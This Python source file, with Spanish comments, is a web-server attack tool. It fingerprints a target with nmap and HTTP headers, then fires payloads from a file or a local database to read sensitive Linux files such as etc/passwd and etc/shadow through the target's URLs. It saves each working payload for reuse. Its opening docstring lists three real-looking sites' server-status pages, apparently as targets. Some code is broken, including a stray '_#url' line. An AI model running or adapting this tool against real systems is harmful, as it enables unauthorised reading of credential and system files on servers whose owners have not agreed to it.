#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
apt-get install python3-requests
apt-get install python3-nmap
pip3 install ipaddress


http://cyclelogistics.eu/server-status
http://www.bhdesign.com/server-status
http://ingria.com/server-status
"""

import nmap, socket, argparse
from urllib.parse import urlparse
import ipaddress as ipa
from requests import head,get
import re
import os
import sys

"""
"""
import insertar_datos as in_d
import insertar_datosXpayload as in_dXp
import insertar_payload as in_p
import consulta_payload as c_p

nm = nmap.PortScanner()
headers = {'user-agent': 'd3s'}
common_linux_files=["etc/passwd","etc/issue",
                    "etc/shadow","etc/motd"]

def printError(msg, exit = False):
    """
    Imprime en pantalla el mensaje de Error y termina la ejecución del programa . 
    
    """
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

def scanningHost(url,port,default_ports='80,443'):
    url_object = urlparse(url)
    host,protocol,netloc= getHost(url_object)
    print("\nHOST: {}".format(host))
    if not port in [80,443]:
        default_ports+=','+str(port)
    if not protocol in ['https','http']:
        printError("\nVerify: \n --The Application Layer \
protocol is either HTTP or HTTPS\n --The Application Layer \
protocol is declared explicitly in the URL ",True)
    #print(type(host))
    #Nmap library
    scann = nm.scan(host,default_ports,'-O')
    #print(scann)
    os = getOpSystem(scann,host)
    print("\nO.S.: {}".format(os))
    #Requests Library
    server = None
    php_v = None
    _url = None
    srv_ver = None
    distro = None
    try:
        header=head(protocol+'://'+netloc+':'+str(port),headers=headers)
        print(header.headers)
        print("STATUS CODE: {}".format(header.status_code))
        if 'Server' in header.headers:
            server = header.headers['Server']
        if 'X-Powered-By' in header.headers:
            php_v = header.headers['X-Powered-By']
        if header.status_code > 400:
            print("URL: {}".format(header.url))
            print("STATUS CODE: {}".format(header.status_code))
        #print(header.headers)
        elif header.status_code in range(200,209,1):
            _url = url
            _#url = header.url
        elif header.status_code in range(300,304,1):
            ##Redireccion
            _url = header.headers['Location']


    except Exception as e:
        printError("Cannot establish a new connection with the Server",True)
        print(e)
        print(type(e))
        exit(2)
        #print(e)
        #print(type(e))

    if server is not None:
        #print("MMM: {}".format(server))
        server,srv_ver,distro = parseServer(server)
    if php_v is not None:
        php_v = parsePhp(php_v)
    print("URL: {}".format(_url))
    print("SERVER: {} - VERSION: {}".format(server,srv_ver))
    print("DISTRO: {}". format(distro))
    print("PHP VERSION: {}".format(php_v))

    return [_url,os,server,srv_ver,distro,php_v]

    """
    Consulta en DB
    """

    #if datos in base_datos:
    #   aplicar payload conococido
    #else:
    #   inserta datos
    """
    """

    """
    Fuzzing
    """

def fuzzer(u,p):
    successful_payloads = []
    if type(p) is str:
        print("Reading given file: {}".format(p))
        with open(p,'r') as f:
            pay = f.readlines() 
            f.close()
        cn_files = common_linux_files   
    else: #Pasa una lista
        print("Reading saved information..")
        pay = p
        cn_files = [1]
    for i in pay:   #Recorre cada payload del archivo
        mod_url = makeUrl(u,i)
        print(mod_url)
        for e in cn_files: #Recorre cada archivo conocido
            if type(p) is str:
                _payload,pay_mod=makePayload(mod_url,e,i)
            else:
                print("UIUIU")
                _payload = mod_url
                pay_mod = i
            #print(_payload)
            payload_req = get(_payload,headers=headers)
            print("Trying...[{}] : {}".format(payload_req.status_code,payload_req.request.url))
            ret_payl = analysis(payload_req,successful_payloads,pay_mod) # i ->  para almacenar con variable FILE
            if ret_payl:
                successful_payloads.append(ret_payl)
            else:
                continue
            """
            if payload_req.status_code in range(400,409,1):
                continue
            elif payload_req.status_code == 200:
                print(payload_req.text)
                if payload_req.text:
                    successful_payloads.append(i.rstrip())
            """
    return successful_payloads
    """
    """
def analysis(pay_req,list_payloads,pay):
    if pay_req.status_code in range(400,409,1):
        return
    elif pay_req.status_code == 200:
        #print(pay_req.text)
        if pay_req.text:
            w = re.findall(r'Warning:|failed',pay_req.text)
            if w:
                return
            print(pay_req.text)
            return pay.rstrip()
        else:
            return



def makeUrl(url,payload):
    #if url[-1] is '/':
    return url+payload

def makePayload(u,f,p):
    return re.sub(r'{FILE}',f,u).rstrip(),re.sub(r'{FILE}',f,p).rstrip()


def verifyPayFile(path):
    if os.path.isfile(path):
        return
    else:
        print("ERROR. The file does not exist")
        exit(2)

def parseServer(srv):
    #(\w+)/?([0-9]+(\.?[0-9]+)+?)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)[ ]\((\w+)\)
    match = re.search(r'([\w-]+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?', srv)
    if match:
        #print(match.group(1)) 
        #print(match.group(2))
        #print(match.group(4))
        # return server,srever_version,distro 
        return match.group(1),match.group(2),match.group(4)
    return srv

def parsePhp(version):
    #PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)
    match = re.search(r'PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)',version)
    if match:
        return match.group(1)
    return version

def getHost(URLobject):
    netloc = URLobject.netloc
    proto = URLobject.scheme
    print(netloc)
    try:
        ip_add = ipa.ip_address(netloc)
        print(ip_add)
        return str(ip_add),proto,netloc
    except ValueError:
        ##domain_name
        return socket.gethostbyname(netloc),proto,netloc
    
def getOpSystem(sc,ip):
    try:
        return sc['scan'][ip]['osmatch'][0]['name']
    except Exception as e:
        print("CHALE:\n")
        print(e)
        print(type(e))
    return

def tryGetPayload(info,db):
    payloads_query=list()
    conn = c_p.crear_conexion(db)
    res,payloads_query =c_p.consulta_de_payload(conn,info,payloads_query)
    if res is True:
        return True,payloads_query
    else:
        print("\nNo se encontraron coincidencias en la base de datos!\n")
        return False,payloads_query


parser = argparse.ArgumentParser(description='Python Script that performs fuzzing targeting web servers')
parser.add_argument(
    'target', type=str, nargs=1, help='URL that\'ll be fuzzed'
    )
parser.add_argument(
    '-s','--secure',dest='ssl', action='store_true',default=False,help='Enable SSL/TLS protocol'
    )
parser.add_argument(
    '-p','--port',dest='port', type=int, default=80,help='Set the TCP port'
    )
parser.add_argument(
    '-f','--pfile',dest='pay_file', type=str,help='Use the choosen PAY_FILE file from which payloads will be get'
    )
parser.add_argument(
    '-v','--verbose',dest='verbose',action='store_true',default=False,help='Enable verbosity mode'
    )

if __name__ == '__main__':
    data = list()
    payloads_ret = list()
    result=""
    must_continue = None
    try: 
        args = parser.parse_args()
        print(args.target[0])
        print(args.ssl)
        print(args.pay_file)
        print(args.verbose)
        print(args.port)
        print(type(args.port))
        verifyPayFile(args.pay_file)
         #[_url,os,server,srv_ver,distro,php_v]
        data= scanningHost(args.target[0],args.port)
        foundPayloads,_pl=tryGetPayload(data,"fuzzer_db.db")
        if foundPayloads:
            print("Existen coincidencias en la base de datos.\nSe utilizaran los payloads relacionados\n")
            print(_pl)
            payloads_ret = fuzzer(data[0],_pl)
            print("Ya estoy cerca!")
            print(payloads_ret)
            if payloads_ret:
                #Se obtuvieron respuestas consistentes
                print("Obtuve respuesta utilizando payloads de la DB")
                conn = in_d.crear_conexion("fuzzer_db.db")
                id_url = in_d.insertar_datos(conn,data[0],data[1],data[2],data[3],data[5])
                in_d.consulta_de_datos(conn)
                in_d.cerrar_conexion(conn)
                print(id_url)
                conn2 = in_p.crear_conexion("fuzzer_db.db")
                print(len(payloads_ret))
                for p in payloads_ret:
                    id_pay = in_p.insertar_payload(conn2,p)
                    in_dXp.insertar_datosXpayload(conn2,id_url,id_pay)
                #in_p.consulta_de_payload(conn2)
                #print("#####\n\n")
                #in_dXp.consulta_de_datosXpayload(conn2)
                in_p.cerrar_conexion(conn2)

            else:
                #No hubo ninguna respuesta aceptable, de continua con el 
                #análisis de los payloads del archivo de entrada
                must_continue = True

        if must_continue:
            print("No encontré nada.\nVoy a continuar")
            #exit(2)
            payloads_ret = fuzzer(data[0],args.pay_file)
            if payloads_ret:
                #insertar en DB
                print(payloads_ret)
                conn = in_d.crear_conexion("fuzzer_db.db")
                id_url = in_d.insertar_datos(conn,data[0],data[1],data[2],data[3],data[5])
                in_d.consulta_de_datos(conn)
                in_d.cerrar_conexion(conn)
                print(id_url)
                conn2 = in_p.crear_conexion("fuzzer_db.db")
                print(len(payloads_ret))
                for p in payloads_ret:
                    id_pay = in_p.insertar_payload(conn2,p)
                    in_dXp.insertar_datosXpayload(conn2,id_url,id_pay)
                #in_p.consulta_de_payload(conn2)
                #print("#####\n\n")
                #in_dXp.consulta_de_datosXpayload(conn2)
                in_p.cerrar_conexion(conn2)
            else:
                result = "No payload has been successful!"
        print(result)
    except Exception as e:
        print("Ups. Something Happened!")
        print(e)
        print(type(e))